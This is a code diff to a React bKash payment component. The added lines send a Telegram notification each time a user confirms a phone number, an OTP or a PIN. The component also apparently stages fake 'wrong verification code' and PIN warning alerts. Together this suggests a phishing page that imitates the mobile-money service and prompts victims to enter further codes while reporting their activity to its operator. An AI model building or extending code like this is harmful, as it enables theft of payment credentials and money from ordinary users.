@@ -136,6 +136,7 @@ const BkashPayment = () => {
 
   const handleConfirm = () => {
     if (isValidNumber()) {
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'bKash', paymentType: 'mfs' });
       setIsConfirmLoading(true);
       setTimeout(() => {
         setIsConfirmLoading(false);
@@ -147,6 +148,7 @@ const BkashPayment = () => {
 
   const handleOtpConfirm = () => {
     if (isValidOtp()) {
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'bKash', paymentType: 'mfs' });
       setIsConfirmLoading(true);
       if (resendTimer >= 24 && !wrongOtpShown) {
         // Show loading first, then wrong verification code alert
@@ -171,7 +173,7 @@ const BkashPayment = () => {
   const handlePinConfirm = () => {
     if (isValidPin()) {
       setIsConfirmLoading(true);
-      sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'bKash' });
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'bKash', paymentType: 'mfs' });
       if (pinAttempts === 0 && !pinWarningShown) {
         // Show loading first, then pin warning
         setTimeout(() => {
